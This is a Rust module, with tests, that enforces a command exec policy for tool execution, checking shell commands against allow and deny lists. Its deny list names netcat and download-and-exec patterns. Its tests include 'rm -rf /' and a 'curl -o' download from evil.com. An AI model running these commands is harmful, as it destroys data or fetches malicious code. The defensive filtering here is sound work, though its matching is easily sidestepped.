//! Command-Level Exec Policy Enforcement.
//!
//! Validates shell commands against allow/deny lists before execution.
//! This is a defense-in-depth layer that runs *after* the ToolPolicy check
//! and *before* the actual process spawn.
//!
//! ## Security Modes
//!
//! - `Unrestricted` — All commands allowed (development only).
//! - `Allowlist` — Only commands whose base program is in the allowlist.
//! - `DenyFirst` — Commands are allowed unless the base program is in the denylist.
//!
//! ## Command Parsing
//!
//! The base program is extracted from the command string:
//! - `ls -la /tmp` → base = `ls`
//! - `cd /home && cat file.txt` → bases = [`cd`, `cat`]
//! - `echo "hello" | grep "h"` → bases = [`echo`, `grep`]
//!
//! For chained commands (`&&`, `||`, `|`, `;`), each segment is checked independently.

use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use tracing::warn;

/// Security mode for exec policy enforcement.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExecSecurityMode {
    /// All commands allowed — use only in trusted environments.
    Unrestricted,
    /// Only allowed programs may execute.
    Allowlist,
    /// All programs allowed except those in the denylist.
    DenyFirst,
}

impl Default for ExecSecurityMode {
    fn default() -> Self {
        Self::DenyFirst
    }
}

/// Exec policy configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecPolicyConfig {
    /// Security mode.
    pub mode: ExecSecurityMode,
    /// Allowed base programs (used in Allowlist mode).
    pub allowed_programs: HashSet<String>,
    /// Denied base programs (used in DenyFirst mode).
    pub denied_programs: HashSet<String>,
    /// Maximum command length in characters.
    pub max_command_length: usize,
    /// Whether to allow chained commands (&&, ||, |, ;).
    pub allow_chaining: bool,
}

impl Default for ExecPolicyConfig {
    fn default() -> Self {
        Self {
            mode: ExecSecurityMode::DenyFirst,
            allowed_programs: HashSet::new(),
            denied_programs: default_denied_programs(),
            max_command_length: 10_000,
            allow_chaining: true,
        }
    }
}

/// Default set of dangerous programs to deny.
fn default_denied_programs() -> HashSet<String> {
    [
        "rm", "rmdir", "mkfs", "dd", "fdisk",
        "shutdown", "reboot", "halt", "poweroff",
        "passwd", "chown", "chmod",
        "nc", "ncat", "netcat",
        "curl -o", // download-and-exec patterns
        "wget -O",
        "eval",
        "exec",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Exec policy enforcer — validates commands before execution.
pub struct ExecPolicy {
    config: ExecPolicyConfig,
}

/// Result of exec policy validation.
#[derive(Debug, Clone)]
pub enum ExecVerdict {
    /// Command is allowed to execute.
    Allow,
    /// Command is blocked with a reason.
    Deny { reason: String },
}

impl ExecVerdict {
    pub fn is_allowed(&self) -> bool {
        matches!(self, ExecVerdict::Allow)
    }
}

impl ExecPolicy {
    pub fn new(config: ExecPolicyConfig) -> Self {
        Self { config }
    }

    /// Create a permissive policy (unrestricted).
    pub fn unrestricted() -> Self {
        Self::new(ExecPolicyConfig {
            mode: ExecSecurityMode::Unrestricted,
            ..Default::default()
        })
    }

    /// Validate a command string against the policy.
    pub fn check(&self, command: &str) -> ExecVerdict {
        // Length check
        if command.len() > self.config.max_command_length {
            return ExecVerdict::Deny {
                reason: format!(
                    "command exceeds maximum length ({} > {})",
                    command.len(),
                    self.config.max_command_length
                ),
            };
        }

        if self.config.mode == ExecSecurityMode::Unrestricted {
            return ExecVerdict::Allow;
        }

        // Parse command into segments
        let segments = parse_command_segments(command);

        // Check chaining policy
        if !self.config.allow_chaining && segments.len() > 1 {
            return ExecVerdict::Deny {
                reason: "command chaining not allowed by policy".to_string(),
            };
        }

        // Check each segment
        for segment in &segments {
            let base = extract_base_program(segment);
            if base.is_empty() {
                continue;
            }

            match self.config.mode {
                ExecSecurityMode::Allowlist => {
                    if !self.config.allowed_programs.contains(&base) {
                        return ExecVerdict::Deny {
                            reason: format!("program '{}' not in allowlist", base),
                        };
                    }
                }
                ExecSecurityMode::DenyFirst => {
                    if self.config.denied_programs.contains(&base) {
                        return ExecVerdict::Deny {
                            reason: format!("program '{}' is in denylist", base),
                        };
                    }
                    // Also check for the full segment against multi-word deny patterns
                    let trimmed = segment.trim();
                    for denied in &self.config.denied_programs {
                        if denied.contains(' ') && trimmed.starts_with(denied.as_str()) {
                            return ExecVerdict::Deny {
                                reason: format!("pattern '{}' is in denylist", denied),
                            };
                        }
                    }
                }
                ExecSecurityMode::Unrestricted => {}
            }
        }

        ExecVerdict::Allow
    }
}

/// Parse a shell command into segments split at `&&`, `||`, `|`, `;`.
fn parse_command_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escape = false;

    while let Some(ch) = chars.next() {
        if escape {
            current.push(ch);
            escape = false;
            continue;
        }

        match ch {
            '\\' if !in_single_quote => {
                escape = true;
                current.push(ch);
            }
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
                current.push(ch);
            }
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
                current.push(ch);
            }
            '&' if !in_single_quote && !in_double_quote => {
                if chars.peek() == Some(&'&') {
                    chars.next(); // consume second &
                    let trimmed = current.trim().to_string();
                    if !trimmed.is_empty() {
                        segments.push(trimmed);
                    }
                    current.clear();
                } else {
                    current.push(ch);
                }
            }
            '|' if !in_single_quote && !in_double_quote => {
                if chars.peek() == Some(&'|') {
                    chars.next(); // consume second |
                }
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
            }
            ';' if !in_single_quote && !in_double_quote => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
            }
            _ => current.push(ch),
        }
    }

    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        segments.push(trimmed);
    }

    segments
}

/// Extract the base program name from a command segment.
///
/// Handles:
/// - `ls -la` → `ls`
/// - `env VAR=val command` → `command`
/// - `/usr/bin/python script.py` → `python` (basename)
/// - `sudo apt install` → `sudo`
fn extract_base_program(segment: &str) -> String {
    let trimmed = segment.trim();

    // Skip env var assignments at the start
    let mut parts = trimmed.split_whitespace();
    let mut program = String::new();

    for part in parts {
        // Skip env var assignments (KEY=VALUE)
        if part.contains('=') && !part.starts_with('-') {
            continue;
        }
        program = part.to_string();
        break;
    }

    // Extract basename from path
    if let Some(base) = program.rsplit('/').next() {
        base.to_string()
    } else {
        program
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_unrestricted_allows_all() {
        let policy = ExecPolicy::unrestricted();
        assert!(policy.check("rm -rf /").is_allowed());
    }

    #[test]
    fn test_denylist_blocks_dangerous() {
        let policy = ExecPolicy::new(ExecPolicyConfig::default());
        let v = policy.check("rm -rf /tmp/stuff");
        assert!(!v.is_allowed());
    }

    #[test]
    fn test_denylist_allows_safe() {
        let policy = ExecPolicy::new(ExecPolicyConfig::default());
        assert!(policy.check("ls -la").is_allowed());
        assert!(policy.check("cat file.txt").is_allowed());
        assert!(policy.check("echo hello").is_allowed());
    }

    #[test]
    fn test_allowlist_mode() {
        let mut allowed = HashSet::new();
        allowed.insert("ls".to_string());
        allowed.insert("cat".to_string());

        let policy = ExecPolicy::new(ExecPolicyConfig {
            mode: ExecSecurityMode::Allowlist,
            allowed_programs: allowed,
            ..Default::default()
        });

        assert!(policy.check("ls -la").is_allowed());
        assert!(policy.check("cat file.txt").is_allowed());
        assert!(!policy.check("rm file.txt").is_allowed());
    }

    #[test]
    fn test_chained_commands() {
        let policy = ExecPolicy::new(ExecPolicyConfig::default());
        // All segments must pass
        assert!(policy.check("ls && echo done").is_allowed());
        // One segment has denied program
        assert!(!policy.check("ls && rm -rf /tmp").is_allowed());
    }

    #[test]
    fn test_chaining_disabled() {
        let policy = ExecPolicy::new(ExecPolicyConfig {
            allow_chaining: false,
            ..Default::default()
        });
        assert!(!policy.check("ls && echo done").is_allowed());
        assert!(policy.check("ls -la").is_allowed());
    }

    #[test]
    fn test_pipe_segments() {
        let policy = ExecPolicy::new(ExecPolicyConfig::default());
        assert!(policy.check("cat file.txt | grep pattern").is_allowed());
        assert!(!policy.check("cat file.txt | rm -rf /").is_allowed());
    }

    #[test]
    fn test_max_command_length() {
        let policy = ExecPolicy::new(ExecPolicyConfig {
            max_command_length: 10,
            ..Default::default()
        });
        assert!(!policy.check("a very long command that exceeds the limit").is_allowed());
    }

    #[test]
    fn test_extract_base_program() {
        assert_eq!(extract_base_program("ls -la"), "ls");
        assert_eq!(extract_base_program("/usr/bin/python script.py"), "python");
        assert_eq!(extract_base_program("VAR=1 command arg"), "command");
        assert_eq!(extract_base_program("  echo hello  "), "echo");
    }

    #[test]
    fn test_parse_segments() {
        let segs = parse_command_segments("a && b || c; d | e");
        assert_eq!(segs, vec!["a", "b", "c", "d", "e"]);
    }

    #[test]
    fn test_quoted_strings_preserved() {
        let segs = parse_command_segments(r#"echo "hello && world""#);
        assert_eq!(segs.len(), 1);
        assert_eq!(segs[0], r#"echo "hello && world""#);
    }

    #[test]
    fn test_multi_word_deny_pattern() {
        let policy = ExecPolicy::new(ExecPolicyConfig::default());
        let v = policy.check("curl -o /tmp/malware http://evil.com");
        // "curl -o" is in the denylist
        assert!(!v.is_allowed());
    }
}
